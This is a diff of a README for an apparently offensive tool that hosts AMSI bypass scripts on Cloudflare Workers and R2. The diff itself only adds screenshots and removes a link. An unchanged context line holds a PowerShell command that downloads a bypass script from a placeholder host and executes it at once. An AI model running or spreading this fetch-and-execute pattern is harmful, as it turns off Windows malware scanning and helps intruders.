@@ -4,6 +4,10 @@
 
 Easy access to your amsi bypass script with Cloudflare workers and R2 bucket. If no "payload id" is given, the workers will select one randomly.
 
+![random](./images/6.jpg)
+
+![payload-id](./images/7.jpg)
+
 ## Description
 
 Cloudflare worker function that selects a AMSI bypass file from a folder in a Cloudflare R2 bucket. The idea came from [Flangvik](https://twitter.com/Flangvik) [AMSI.fail](https://github.com/Flangvik/AMSI.fail).
@@ -76,10 +80,6 @@ iex(iwr -UseBasicParsing -Uri 'https://amsi-r2.example.com/amsibypass?payload=2'
 ## Todo
 
 Integrate the logic/obfuscation of [AMSI.fail](https://github.com/Flangvik/AMSI.fail)
-
-## More ?
-
-You want something with a UI ? Take a look at [Some-R2-Explorer](https://github.com/service-yack/Some-R2-Explorer)
 
 ## Credits
 
